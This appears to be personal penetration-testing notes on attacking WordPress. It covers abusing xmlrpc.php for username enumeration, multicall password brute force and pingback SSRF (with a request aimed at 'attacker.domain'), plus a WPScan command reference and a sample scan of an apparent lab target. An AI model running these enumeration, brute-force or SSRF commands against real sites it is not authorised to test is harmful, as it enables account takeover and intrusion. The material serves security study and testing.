- WordPress's `xmlrpc.php` is a legacy remote management interface originally designed for mobile apps and external blogging clients like `MarsEdit`. It's enabled by default in all WordPress installations, and it is an absolute disaster from a security perspective — exposes an enormous attack surface, from authentication bypass to DoS via `system.multicall`.

- Confirm XML-RPC is enabled:

```bash
curl -s https://example.com/xmlrpc.php
```

- A non-404 response confirms XML-RPC is active. By default, the server returns  `XML-RPC server accepts POST requests only.`

### Listing available methods

```bash
curl -s -X POST https://example.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

- This returns a full list of supported methods — `wp.getUsers`, `wp.uploadFile`, `metaWeblog.newPost`, etc. The presence of `wp.uploadFile` is particularly interesting for post-auth exploitation.

>[!note] Sometimes you will see errors like `<name>faultString</name><value><string>parse error. not well formed</string></value>`. This might mean the server considers the XML you sent invalid, but it also happens **when PHP lacks XML support**, so **WordPress literally **can't parse XML-RPC requests** and throws a misleading error.

>[!example]-
> ```bash
> curl -X POST -d '<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' 'http://redactd.com/xmlrpc.php'
> ```
> 
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <methodResponse>
>   <params>
>     <param>
>       <value>
>       <array><data>
>   <value><string>system.multicall</string></value>
>   <value><string>system.listMethods</string></value>
>   <value><string>system.getCapabilities</string></value>
>   <value><string>demo.addTwoNumbers</string></value>
>   <value><string>demo.sayHello</string></value>
>   <value><string>pingback.extensions.getPingbacks</string></value>
>   <value><string>pingback.ping</string></value>
>   <value><string>mt.publishPost</string></value>
>   <value><string>mt.getTrackbackPings</string></value>
>   <value><string>mt.supportedTextFilters</string></value>
>   <value><string>mt.supportedMethods</string></value>
>   <value><string>mt.setPostCategories</string></value>
>   <value><string>mt.getPostCategories</string></value>
>   <value><string>mt.getRecentPostTitles</string></value>
>   <value><string>mt.getCategoryList</string></value>
>   <value><string>metaWeblog.getUsersBlogs</string></value>
>   <value><string>metaWeblog.deletePost</string></value>
>   <value><string>metaWeblog.newMediaObject</string></value>
>   <value><string>metaWeblog.getCategories</string></value>
>   <value><string>metaWeblog.getRecentPosts</string></value>
>   <value><string>metaWeblog.getPost</string></value>
>   <value><string>metaWeblog.editPost</string></value>
>   <value><string>metaWeblog.newPost</string></value>
>   <value><string>blogger.deletePost</string></value>
>   <value><string>blogger.editPost</string></value>
>   <value><string>blogger.newPost</string></value>
>   <value><string>blogger.getRecentPosts</string></value>
>   <value><string>blogger.getPost</string></value>
>   <value><string>blogger.getUserInfo</string></value>
>   <value><string>blogger.getUsersBlogs</string></value>
>   <value><string>wp.restoreRevision</string></value>
>   <value><string>wp.getRevisions</string></value>
>   <value><string>wp.getPostTypes</string></value>
>   <value><string>wp.getPostType</string></value>
>   <value><string>wp.getPostFormats</string></value>
>   <value><string>wp.getMediaLibrary</string></value>
>   <value><string>wp.getMediaItem</string></value>
>   <value><string>wp.getCommentStatusList</string></value>
>   <value><string>wp.newComment</string></value>
>   <value><string>wp.editComment</string></value>
>   <value><string>wp.deleteComment</string></value>
>   <value><string>wp.getComments</string></value>
>   <value><string>wp.getComment</string></value>
>   <value><string>wp.setOptions</string></value>
>   <value><string>wp.getOptions</string></value>
>   <value><string>wp.getPageTemplates</string></value>
>   <value><string>wp.getPageStatusList</string></value>
>   <value><string>wp.getPostStatusList</string></value>
>   <value><string>wp.getCommentCount</string></value>
>   <value><string>wp.deleteFile</string></value>
>   <value><string>wp.uploadFile</string></value>
>   <value><string>wp.suggestCategories</string></value>
>   <value><string>wp.deleteCategory</string></value>
>   <value><string>wp.newCategory</string></value>
>   <value><string>wp.getTags</string></value>
>   <value><string>wp.getCategories</string></value>
>   <value><string>wp.getAuthors</string></value>
>   <value><string>wp.getPageList</string></value>
>   <value><string>wp.editPage</string></value>
>   <value><string>wp.deletePage</string></value>
>   <value><string>wp.newPage</string></value>
>   <value><string>wp.getPages</string></value>
>   <value><string>wp.getPage</string></value>
>   <value><string>wp.editProfile</string></value>
>   <value><string>wp.getProfile</string></value>
>   <value><string>wp.getUsers</string></value>
>   <value><string>wp.getUser</string></value>
>   <value><string>wp.getTaxonomies</string></value>
>   <value><string>wp.getTaxonomy</string></value>
>   <value><string>wp.getTerms</string></value>
>   <value><string>wp.getTerm</string></value>
>   <value><string>wp.deleteTerm</string></value>
>   <value><string>wp.editTerm</string></value>
>   <value><string>wp.newTerm</string></value>
>   <value><string>wp.getPosts</string></value>
>   <value><string>wp.getPost</string></value>
>   <value><string>wp.deletePost</string></value>
>   <value><string>wp.editPost</string></value>
>   <value><string>wp.newPost</string></value>
>   <value><string>wp.getUsersBlogs</string></value>
> </data></array>
>       </value>
>     </param>
>   </params>
> </methodResponse>
> ```
### Username enumeration via XML-RPC

- The `wp.getUsersBlogs` method is used to retrieve a list pf blogs that a user belongs to. It requires a username and password and returns **different error messages** depending on whether the username exists.

```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>wrongpassword</string></value></param>
  </params>
</methodCall>'
```

| Condition                            | Response                                        |
| ------------------------------------ | ----------------------------------------------- |
| The username doesn't exist.          | `<faultString>Invalid username</faultString>`   |
| The username exists, wrong password. | `<faultString>Incorrect password</faultString>` |
| Valid credentials.                   | Full blog list in response                      |

### Credential Brute-Force via system.multicall

- The `system.multicall` method allows batching multiple RPC calls **into a single HTTP request**. This means you can test hundreds of passwords **in one request**, completely bypassing rate-limiting on `wp-login.php` and standard brute-force detection.

- `WPScan` (see [[#WPScan]]) handles this natively:

```bash
wpscan --url https://example.com \
       --password-attack xmlrpc-multicall \
       -U admin \
       -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
       -t 20
```

- The multicall method was the original reason XML-RPC became such a liability. WordPress versions before 4.4 have no internal limit on the number of calls per multicall batch — you can send 500 login attempts in a single request.

### pingback.ping as SSRF

- The `pingback.ping` method accepts a source URL and a target URL and makes a server-side HTTP request to the source. A classic SSRF vector:

```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value><string>http://attacker.domain</string></value></param>
    <param><value><string>https://example.com/some-post/</string></value></param>
  </params>
</methodCall>'
```



## WPScan 

>[WPScan](https://wpscan.com/) is an automated WordPress security scanner that identifies WordPress core vulnerabilities, plugin/theme version information, exposed configuration, and user accounts using passive and aggressive detection techniques.

>[!note]+ Installation
>
>```bash
>sudo gem install wpscan
>```

### `--enumerate`

- Full default enumeration (vulnerable plugins, themes, users, config backups, DB exports):

```bash
wpscan --url https://example.com --enumerate
```

- Enumerate all plugins (passive + active version detection):

```bash
wpscan --url https://example.com --enumerate ap --plugins-detection aggressive
```

- Enumerate vulnerable plugins only (much faster):

```bash
wpscan --url https://example.com --enumerate vp --api-token $WPSCAN_API_TOKEN
```

- Enumerate users (IDs `1`-`20` by default):

```bash
wpscan --url https://example.com --enumerate u
```

- Enumerate users with a wider range:

```bash
wpscan --url https://example.com --enumerate u1-50
```

- Passive detection only, random `User-Agent` (kinda stealth):

```bash
wpscan --url https://example.com --stealthy --enumerate vp,u
```

- Output in JSON:

```bash
wpscan --url https://example.com --enumerate ap,u -f json -o wpscan-output.json
```

- `--enumerate` options:

| Flag    | Description                                                   |
| ------- | ------------------------------------------------------------- |
| `vp`    | Vulnerable plugins only.                                      |
| `ap`    | All plugins.                                                  |
| `p`     | Popular plugins only.                                         |
| `vt`    | Vulnerable themes only.                                       |
| `at`    | All themes.                                                   |
| `t`     | Popular themes only.                                          |
| `tt`    | Timthumbs (legacy image resize script, RCE history).          |
| `cb`    | Config backups (`wp-config.php.bak`, `wp-config.php~`, etc.). |
| `dbe`   | Database exports (`.sql` files in webroot).                   |
| `u`     | User IDs `1`-`10` (default range).                            |
| `u1-50` | User IDs `1`-`50`.                                            |
| `m`     | Media IDs (requires permalink set to Plain).                  |

>[!important] Value if no argument supplied: `vp,vt,tt,cb,dbe,u,m`.

>[!warning] Incompatible choices (only one of each group/s can be used)
>- `vp` (vulnerable plugins), `ap` (all plugins), `p` (popular plugins).
>- `vt` (vulnerable themes), `at` (all themes), `t` (popular themes).

>[!important]+ API token
> - WPScan API token allows you to query vulnerability data from the WordPress Vulnerability Database (WPVulnDB). Without the token, WPScan identifies versions but can't display vulnerability details.
> - To get a free token (25 daily requests), register at [`wpscan.com`](https://wpscan.com/register) for a free token (25 daily requests).
> 
> ```bash
> wpscan --url https://target.com --api-token YOUR_TOKEN_HERE --enumerate vp
> ```


>[!example]-
> - Enumerate all installed plugins:
> 
> ```bash
> wpscan --url http://154.57.164.64:31837 --enumerate ap 
> ```
> 
> ```bash
> _______________________________________________________________
>          __          _______   _____
>          \ \        / /  __ \ / ____|
>           \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
>            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
>             \  /\  /  | |     ____) | (__| (_| | | | |
>              \/  \/   |_|    |_____/ \___|\__,_|_| |_|
> 
>          WordPress Security Scanner by the WPScan Team
>                          Version 3.8.28
>        Sponsored by Automattic - https://automattic.com/
>        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
> _______________________________________________________________
> 
> [+] URL: http://154.57.164.64:31837/ [154.57.164.64]
> [+] Started: Sun Mar 22 17:21:12 2026
> 
> Interesting Finding(s):
> 
> [+] Headers
>  | Interesting Entry: Server: nginx
>  | Found By: Headers (Passive Detection)
>  | Confidence: 100%
> 
> [+] XML-RPC seems to be enabled: http://154.57.164.64:31837/xmlrpc.php
>  | Found By: Direct Access (Aggressive Detection)
>  | Confidence: 100%
>  | References:
>  |  - http://codex.wordpress.org/XML-RPC_Pingback_API
>  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
>  |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
>  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
>  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
> 
> [+] WordPress readme found: http://154.57.164.64:31837/readme.html
>  | Found By: Direct Access (Aggressive Detection)
>  | Confidence: 100%
> 
> [+] Upload directory has listing enabled: http://154.57.164.64:31837/wp-content/uploads/
>  | Found By: Direct Access (Aggressive Detection)
>  | Confidence: 100%
> 
> [+] The external WP-Cron seems to be enabled: http://154.57.164.64:31837/wp-cron.php
>  | Found By: Direct Access (Aggressive Detection)
>  | Confidence: 60%
>  | References:
>  |  - https://www.iplocation.net/defend-wordpress-from-ddos
>  |  - https://github.com/wpscanteam/wpscan/issues/1299
> 
> [+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
>  | Found By: Rss Generator (Passive Detection)
>  |  - http://154.57.164.64:31837/feed/, <generator>https://wordpress.org/?v=5.1.6</generator>
>  |  - http://154.57.164.64:31837/comments/feed/, <generator>https://wordpress.org/?v=5.1.6</generator>
> 
> [+] WordPress theme in use: ben_theme
>  | Location: http://154.57.164.64:31837/wp-content/themes/ben_theme/
>  | Readme: http://154.57.164.64:31837/wp-content/themes/ben_theme/readme.txt
>  | Style URL: http://154.57.164.64:31837/wp-content/themes/ben_theme/style.css?ver=5.1.6
>  | Style Name: Transportex
>  | Style URI: https://themeansar.com/free-themes/transportex/
>  | Description: Transportex is a transport, logistics & home movers WordPress theme with focus on create online tran...
>  | Author: Themeansar
>  | Author URI: https://themeansar.com/
>  |
>  | Found By: Css Style In Homepage (Passive Detection)
>  | Confirmed By: Css Style In 404 Page (Passive Detection)
>  |
>  | Version: 1.6.7 (80% confidence)
>  | Found By: Style (Passive Detection)
>  |  - http://154.57.164.64:31837/wp-content/themes/ben_theme/style.css?ver=5.1.6, Match: 'Version: 1.6.7'
> 
> [+] Enumerating All Plugins (via Passive Methods)
> [+] Checking Plugin Versions (via Passive and Aggressive Methods)
> 
> [i] Plugin(s) Identified:
> 
> [+] mail-masta
>  | Location: http://154.57.164.64:31837/wp-content/plugins/mail-masta/
>  | Latest Version: 1.0 (up to date)
>  | Last Updated: 2014-09-19T07:52:00.000Z
>  |
>  | Found By: Urls In Homepage (Passive Detection)
>  | Confirmed By: Urls In 404 Page (Passive Detection)
>  |
>  | Version: 1.0 (80% confidence)
>  | Found By: Readme - Stable Tag (Aggressive Detection)
>  |  - http://154.57.164.64:31837/wp-content/plugins/mail-masta/readme.txt
> 
> [+] photo-gallery
>  | Location: http://154.57.164.64:31837/wp-content/plugins/photo-gallery/
>  | Last Updated: 2026-03-03T18:04:00.000Z
>  | [!] The version is out of date, the latest version is 1.8.39
>  |
>  | Found By: Urls In Homepage (Passive Detection)
>  | Confirmed By: Urls In 404 Page (Passive Detection)
>  |
>  | Version: 1.5.34 (100% confidence)
>  | Found By: Query Parameter (Passive Detection)
>  |  - http://154.57.164.64:31837/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34
>  |  - http://154.57.164.64:31837/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34
>  |  - http://154.57.164.64:31837/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34
>  |  - http://154.57.164.64:31837/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34
>  | Confirmed By:
>  |  Readme - Stable Tag (Aggressive Detection)
>  |   - http://154.57.164.64:31837/wp-content/plugins/photo-gallery/readme.txt
>  |  Readme - ChangeLog Section (Aggressive Detection)
>  |   - http://154.57.164.64:31837/wp-content/plugins/photo-gallery/readme.txt
> 
> [+] wp-google-places-review-slider
>  | Location: http://154.57.164.64:31837/wp-content/plugins/wp-google-places-review-slider/
>  | Last Updated: 2025-12-03T17:07:00.000Z
>  | [!] The version is out of date, the latest version is 17.7
>  |
>  | Found By: Urls In Homepage (Passive Detection)
>  | Confirmed By: Urls In 404 Page (Passive Detection)
>  |
>  | Version: 6.1 (80% confidence)
>  | Found By: Readme - Stable Tag (Aggressive Detection)
>  |  - http://154.57.164.64:31837/wp-content/plugins/wp-google-places-review-slider/README.txt
> 
> [!] No WPScan API Token given, as a result vulnerability data has not been output.
> [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
> 
> [+] Finished: Sun Mar 22 17:21:18 2026
> [+] Requests Done: 37
> [+] Cached Requests: 6
> [+] Data Sent: 9.557 KB
> [+] Data Received: 280.856 KB
> [+] Memory used: 264.945 MB
> [+] Elapsed time: 00:00:06
> ```

### Password brute-force

WPScan supports three attack modes:

| Mode               | Description                                                        |
| ------------------ | ------------------------------------------------------------------ |
| `wp-login`         | Standard `POST` to `wp-login.php` — slow, rate-limited, loud.      |
| `xmlrpc`           | One login attempt per XML-RPC request — faster.                    |
| `xmlrpc-multicall` | Batches 500 passwords per request — fastest, bypasses rate limits. |

>[!note] WPScan auto-detects and selects the appropriate method if you don't specify `--password-attack`.

> [!warning] `xmlrpc-multicall` only works against WordPress < `4.4` without modifications. Against newer installs, fall back to `xmlrpc` or `wp-login`. 

- Brute-force a known user via XML-RPC `multicall`:

```bash
wpscan --url https://example.com \
       --password-attack xmlrpc-multicall \
       -U admin \
       -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
       -t 20
```

- Multiple users from a file:

```bash
wpscan --url https://target.com \
       --password-attack xmlrpc \
       -U users.txt \
       -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```


### Option reference

- Help and version:

| Option            | Description                                             |
| ----------------- | ------------------------------------------------------- |
| `-h`, `--help`    | Display the simple help and exit.                       |
| `--hh`            | Display the full help and exit.                         |
| `--version`       | Display WPScan version and exit.                        |
| `-v`, `--verbose` | Verbose mode.                                           |
| `--[no-]banner`   | Whether or not to display the banner (default: `true`). |
| `--[no-]update`   | Whether or not to update the Database.                  |

- Enumeration:

| Option                | Description                                                                                                                  |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `--url <url>`         | Target URL (required).<br>Allowed Protocols: `http`, `https` (in none provided, default: `http`).                            |
| `--enumerate <opts>`  | What to enumerate: `vp`, `ap`, `p`, `vt`, `at`, `t`, `tt`, `cb`, `dbe`, `u`, `m`.                                            |
| `--api-token <token>` | The WPScan API Token to display vulnerability data, available at [`https://wpscan.com/profile`](https://wpscan.com/profile). |


- Request customization:


| Option                     | Description                                                                    |
| -------------------------- | ------------------------------------------------------------------------------ |
| `--cookie-string <cookie>` | Cookie string to use in requests;<br>Format: `cookie1=value1; cookie2=value2`. |
| `--cookie-jar <file-path>` | File to read and write cookies (default: `/tmp/wpscan/cookie_jar.txt`).        |

- Username and password brute-force:

| Option                                   | Description                                                                                                                |
| ---------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| `--login-uri <uri>`                      | The URI of the login page if different from `wp-login.php`.                                                                |
| `--password-attack <type>`               | Force `wp-login`, `xmlrpc`, or `xmlrpc-multicall` (only works against WordPress <4.4).                                     |
| `-P`, `--passwords <file-path>`          | List of passwords to use during password attack. <br>If no `--usernames` option supplied, user enumeration will be run.    |
| `-U`, `--usernames <list>`               | List of usernames to use during password attack (comma-separate list or file, e.g., `'a1'`, `'a1,a2,a3'`, `'/tmp/a.txt'`). |
| `--exclude-usernames <regexp_or_string>` | Exclude usernames matching the regexp/string (case insensitive). <br>Regexp delimiters are not required.                   |
| `--multicall-max-passwords <max_pwd>`    | Maximum number of passwords to send by request with XML RPC multi-call (default: `500`).                                   |

- Stealthiness:

| Option                               | Description                                                                                                                                   |
| ------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------- |
| `--api-token <token>`                | WPVulnDB API token for vulnerability data.                                                                                                    |
| `--detection-mode <mode>`            | Detection mode (`passive`, `aggressive`, or `mixed`; default: `mixed`).                                                                       |
| `--plugins-detection <mode>`         | Override plugin detection mode (`passive`, `aggressive`, or `mixed`; default: `passive`).                                                     |
| `--plugins-version-detection <mode>` | Override plugin version detection mode (`passive`, `aggressive`, or `mixed`; default: `mixed`).                                               |
| `--stealthy`                         | Alias for `--random-user-agent`, `--detection-mode passive`, `--plugins-version-detection passive` (passive detection + random `User-Agent`). |
| `--random-user-agent`                | Random `User-Agent` per request.                                                                                                              |
| `-t`, `--max-threads <n>`            | Number of threads to use (default: `5`).                                                                                                      |
| `--throttle <ms>`                    | Milliseconds to wait between requests. <br>If used, `--max-threads` is set to `1`.                                                            |
| `--proxy <proto://ip:port>`          | Route traffic through a proxy.                                                                                                                |
| `--proxy-auth <login:password>`      | Authentication credentials for the proxy in use.                                                                                              |

- Output:

| Option                                       | Description                                                                                                                                      |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `--exclude-content-based <regexp_or_string>` | Exclude all responses matching the regexp (case insensitive). <br>Both the headers and body are checked. <br>Regexp delimiters are not required. |
| `-o`, `--output <file>`                      | Save output to file                                                                                                                              |
| `-f`, `--format <fmt>`                       | Output format: `cli`, `json`, `cli-no-colour`.                                                                                                   |

- Other:

| Option                        | Description                                                         |
| ----------------------------- | ------------------------------------------------------------------- |
| `--force`                     | Do not check if the target is running WordPress or returns a `403`. |
| `--disable-tls-checks`        | Disable SSL certificate verification.                               |
| `--wp-content-dir <dir>`      | `wp-content` directory if custom or not detected.                   |
| `--wp-plugins-dir <dir>`      | The plugins directory if custom or not detected.                    |
| `--request-timeout <seconds>` | The request timeout in seconds (default: `60`).                     |
| `--connect-timeout <seconds>` | The connection timeout in seconds (default: `30`).                  |


## References and further reading

- [`Tables (structure) of the WordPress Database — wp-kama`](https://wp-kama.com/handbook/wordpress/wp-database-schema)
- [`WordPress Statistics: How Many Websites Use WordPress in 2025? — colorlib`](https://colorlib.com/wp/wordpress-statistics/)
- [`WordPress File and Directory Structure: A Comprehensive Guide — wpwebinfotech`](https://wpwebinfotech.com/blog/wordpress-file-and-directory-structure-guide/)
- [`WordPress User Enumeration — Hacker Target`](https://hackertarget.com/wordpress-user-enumeration/)
- [`xmlrpc-attack — rm-onata, GitHub`](https://github.com/rm-onata/xmlrpc-attack)

- [`WPScan Vulnerability Database — WPScan`](https://wpscan.com/plugins)
- [`SecLists CMS Wordlists`](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/CMS) 
- [`WPScan — Hackviser`](https://hackviser.com/tactics/tools/wpcan)
